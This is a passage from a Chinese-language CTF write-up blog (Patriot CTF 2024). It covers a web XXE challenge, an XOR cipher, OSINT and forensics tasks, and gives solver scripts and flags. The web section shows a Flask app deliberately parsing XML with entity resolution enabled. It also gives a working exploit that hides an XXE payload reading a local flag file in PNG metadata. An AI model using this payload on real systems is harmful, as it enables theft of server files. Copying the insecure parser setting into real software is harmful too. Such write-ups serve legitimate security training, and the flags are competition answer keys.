class="string">&#x27;upload.html&#x27;</span>, filename=filename)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/check&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    r = requests.Session()</span><br><span class="line">    allow_ip = request.headers[<span class="string">&#x27;Host&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        url = request.form[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">        url_parsed = urllib.parse.urlparse(url).netloc </span><br><span class="line">        <span class="keyword">if</span> allow_ip == url_parsed:</span><br><span class="line">            get_content = r.get(url = url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Cannot request for that url&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            parsed_json = json.loads(get_content.content.decode())[<span class="string">&quot;Comment&quot;</span>]</span><br><span class="line">            parser = etree.XMLParser(no_network=<span class="literal">False</span>, resolve_entities=<span class="literal">True</span>)</span><br><span class="line">            get_doc = etree.fromstring(<span class="built_in">str</span>(parsed_json), parser)</span><br><span class="line">            <span class="built_in">print</span>(get_doc, <span class="string">&quot;ho&quot;</span>)</span><br><span class="line">            result = etree.tostring(get_doc)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Something wrong!!&quot;</span></span><br><span class="line">        <span class="keyword">if</span> result: <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> <span class="string">&quot;Empty head&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;check.html&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/meta&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meta</span>():</span><br><span class="line">    iname = request.args.get(<span class="string">&quot;image&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = UPLOAD_FOLDER + <span class="string">&#x27;/&#x27;</span> + iname</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            image = Image.<span class="built_in">open</span>(name)</span><br><span class="line">            image_dict = &#123;</span><br><span class="line">                   <span class="string">&quot;Filename&quot;</span>: image.filename,</span><br><span class="line">                   <span class="string">&quot;Image Size&quot;</span>: image.size,</span><br><span class="line">                   <span class="string">&quot;Comment&quot;</span>: image.info.get(<span class="string">&#x27;Comment&#x27;</span>)</span><br><span class="line">                   &#125;</span><br><span class="line">            <span class="keyword">return</span> image_dict</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File not found.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;meta.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.secret_key = <span class="string">&quot;734df63066793dfe6f7e417d4d80f453&quot;</span></span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9090</span>)</span><br></pre></td></tr></table></figure>
<p>幾個觀察，&#x2F;check路徑會去把json資料parse出來之後拿去lxml的etree讀資料，最後把結果輸出，赤裸裸的XXE。<br>然後可以上傳圖片，去&#x2F;meta路徑正好就可以拿到json格式的圖片資料<br>最後寫腳本改一下圖片info即可。  </p>
<p><strong>Exploit</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL.PngImagePlugin <span class="keyword">import</span> PngInfo</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;file:///app/flag.txt&quot; &gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;whale&gt;</span></span><br><span class="line"><span class="string">&amp;xxe;</span></span><br><span class="line"><span class="string">&lt;/whale&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;wifu.png&quot;</span>)</span><br><span class="line">metadata = PngInfo()</span><br><span class="line">metadata.add_text(<span class="string">&quot;Comment&quot;</span>, payload)</span><br><span class="line">image.save(<span class="string">&quot;wifu.png&quot;</span>, pnginfo=metadata)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;wifu.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:f&#125;</span><br><span class="line">url_base=<span class="string">&#x27;http://chal.competitivecyber.club:9090/&#x27;</span></span><br><span class="line">web=req.post(url_base, files=files)</span><br><span class="line">file_name=web.text[web.text.index(<span class="string">&#x27;Successfully uploaded: &#x27;</span>)+<span class="number">23</span>:web.text.index(<span class="string">&#x27;Successfully uploaded: &#x27;</span>)+<span class="number">36</span>]</span><br><span class="line">data=&#123;<span class="string">&#x27;url&#x27;</span>:<span class="string">&#x27;http://chal.competitivecyber.club:9090/meta?image=&#x27;</span>+file_name&#125;</span><br><span class="line">web=req.post(url_base+<span class="string">&#x27;check&#x27;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(web.text)</span><br></pre></td></tr></table></figure>
<p>p.s.附上wifu.png  </p>
<p><img src="https://hackmd.io/_uploads/rkK-ceaTR.png" alt="image">  </p>
<blockquote>
<p>Flag: PCTF{Y0u_D00m3D_U5_Man_So_SAD}</p>
</blockquote>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="idk-cipher"><a href="#idk-cipher" class="headerlink" title="idk cipher"></a>idk cipher</h3><ul>
<li>Solver: Whale120(wha13)</li>
</ul>
<p><strong>chal.py</strong>  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">********************************************</span></span><br><span class="line"><span class="string">*                                          *</span></span><br><span class="line"><span class="string">*                                          *</span></span><br><span class="line"><span class="string">********************************************</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># WARNING: This is a secret key. Do not expose it.</span></span><br><span class="line">srt_key = <span class="string">&#x27;secretkey&#x27;</span> <span class="comment"># // <span class="doctag">TODO:</span> change the placeholder</span></span><br><span class="line">usr_input = <span class="built_in">input</span>(<span class="string">&quot;\t:&quot;</span>*<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(usr_input) &lt;= <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;PT must be greater than 1&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(usr_input) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;PT can only be an even number&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> usr_input.isalnum():</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Only alphabets and numbers supported&quot;</span>)</span><br><span class="line"><span class="comment"># WARNING: Reversing input might expose sensitive information.</span></span><br><span class="line">rsv_input = usr_input[::-<span class="number">1</span>]</span><br><span class="line">output_arr = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(usr_input) / <span class="number">2</span>)):</span><br><span class="line">    c1 = <span class="built_in">ord</span>(usr_input[i])</span><br><span class="line">    c2 = <span class="built_in">ord</span>(rsv_input[i])</span><br><span class="line">    enc_p1 = <span class="built_in">chr</span>(c1 ^ <span class="built_in">ord</span>(srt_key[i % <span class="built_in">len</span>(srt_key)]))</span><br><span class="line">    enc_p2 = <span class="built_in">chr</span>(c2 ^ <span class="built_in">ord</span>(srt_key[i % <span class="built_in">len</span>(srt_key)]))</span><br><span class="line">    output_arr.append(enc_p1)</span><br><span class="line">    output_arr.append(enc_p2)</span><br><span class="line"><span class="comment"># WARNING: Encoded text should not be decoded without proper authorization.</span></span><br><span class="line">encoded_val = <span class="string">&#x27;&#x27;</span>.join(output_arr)</span><br><span class="line">b64_enc_val = base64.b64encode(encoded_val.encode())</span><br><span class="line">R = <span class="string">&quot;R&quot;</span>*<span class="number">20</span></span><br><span class="line">E = <span class="string">&quot;E&quot;</span>*<span class="number">5</span></span><br><span class="line">EXCLAMATION = <span class="string">&quot;!&quot;</span>*<span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ULTRA SUPE<span class="subst">&#123;R&#125;</span> SECUR<span class="subst">&#123;E&#125;</span> Encoded Cipher Text<span class="subst">&#123;EXCLAMATION&#125;</span>:&quot;</span>, b64_enc_val.decode())</span><br></pre></td></tr></table></figure>
<p><code>ciphertext:QRVWUFdWEUpdXEVGCF8DVEoYEEIBBlEAE0dQAURFD1I=</code><br>然後檔案裡的srt_key是真的key，直接反著做  </p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">secret=<span class="string">b&#x27;QRVWUFdWEUpdXEVGCF8DVEoYEEIBBlEAE0dQAURFD1I=&#x27;</span></span><br><span class="line">flag=xor(base64.b64decode(secret), <span class="string">b&#x27;sseeccrreettkkeeyy&#x27;</span>).decode()</span><br><span class="line">new_flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>, <span class="number">2</span>):</span><br><span class="line">    new_flag+=flag[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">    new_flag+=flag[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(new_flag)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Flag: pctf{234c81cf3cd2a50d91d5cc1a1429855f}</p>
</blockquote>
<h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Night-School"><a href="#Night-School" class="headerlink" title="Night School"></a>Night School</h3><ul>
<li>Solver: Whale120(wha13)<br>拿到一張照片，找雕像名字<br>題目敘述有提到FireFax，用<code>Fairfax campus statue</code>為關鍵字搜尋就找到這篇Blog：<a target="_blank" rel="noopener" href="https://academeblog.org/2020/04/23/the-silencing-of-contingent-faculty-voices-in-secret-presidential-searches/">https://academeblog.org/2020/04/23/the-silencing-of-contingent-faculty-voices-in-secret-presidential-searches/</a><br><img src="https://hackmd.io/_uploads/ryI-oMnpR.png" alt="image"></li>
</ul>
<blockquote>
<p>Flag: pctf{Communitas}</p>
</blockquote>
<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Bad-Blood"><a href="#Bad-Blood" class="headerlink" title="Bad Blood"></a>Bad Blood</h3><p>拿到一個windows log file，要做一系列問答，基本上就是問腳本類型&#x2F;protocol跟C2網路，但從頭到尾只注意到這個REPO：<a target="_blank" rel="noopener" href="https://github.com/IAMinZoho/OFFSEC-PowerShell/">https://github.com/IAMinZoho/OFFSEC-PowerShell/</a>，關於腳本的問題就直接把上面的東西list出來爆破就有。<br>Protocol:猜到Winrm, C2架構一樣爆…<br><img src="https://hackmd.io/_uploads/H1Nsfdn60.png" alt="image"><br><del>壯觀的爆破場面</del>  </p>
<blockquote>
<p>Flag: pctf{3v3nt_l0gs_reve4l_al1_a981eb}  </p>
</blockquote>
<h3 id="A-Dire-Situation"><a href="#A-Dire-Situation" class="headerlink" title="A Dire Situation"></a>A Dire Situation</h3><p>會拿到一個budget.wim的檔案，用7z把他拆開會拿到一個budget跟一個budget:streamingjpegjfif的檔案<br>拿streamingjpegjfif上網查一下會發現一種叫做mjpeg的檔案類型，簡單來說就是類似影片，把jfif stream起來<br>利用VCL Media Player跑起來發現畫面很短，拚手速：  </p>
<p><img src="https://hackmd.io/_uploads/S15jYqTa0.png" alt="image">  </p>
<blockquote>
<p>Flag: pctf{alternate_d4t4_str3aming_&amp;_chill}</p>
</blockquote>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Open-Seasame"><span class="toc-number">3.1.</span> <span class="toc-text">Open Seasame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impersonate"><span class="toc-number">3.2.</span> <span class="toc-text">Impersonate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KIRAN-SAU-PROBLEM"><span class="toc-number">3.3.</span> <span class="toc-text">KIRAN SAU PROBLEM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dogdays"><span class="toc-number">3.4.</span> <span class="toc-text">dogdays</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blob"><span class="toc-number">3.5.</span> <span class="toc-text">Blob</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-DOM"><span class="toc-number">3.6.</span> <span class="toc-text">DOM DOM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#idk-cipher"><span class="toc-number">4.1.</span> <span class="toc-text">idk cipher</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT"><span class="toc-number">5.</span> <span class="toc-text">OSINT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Night-School"><span class="toc-number">5.1.</span> <span class="toc-text">Night School</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">6.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bad-Blood"><span class="toc-number">6.1.</span> <span class="toc-text">Bad Blood</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-Dire-Situation"><span class="toc-number">6.2.</span> <span class="toc-text">A Dire Situation</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/09/21/patriotctf2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/09/21/patriotctf2024/&text=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/09/21/patriotctf2024/&title=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/09/21/patriotctf2024/&is_video=false&description=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Patriot CTF 2024 Write Up by Whale120&body=Check out this article: http://wha13.github.io/2024/09/21/patriotctf2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/09/21/patriotctf2024/&title=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/09/21/patriotctf2024/&title=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/09/21/patriotctf2024/&title=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/09/21/patriotctf2024/&title=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/09/21/patriotctf2024/&name=Patriot CTF 2024 Write Up by Whale120&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/09/21/patriotctf2024/&t=Patriot CTF 2024 Write Up by Whale120"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2025
    William Lin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
